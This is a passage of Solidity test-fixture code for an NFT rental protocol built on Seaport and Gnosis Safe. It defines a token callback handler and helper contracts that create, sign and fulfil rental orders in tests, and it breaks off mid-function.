Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                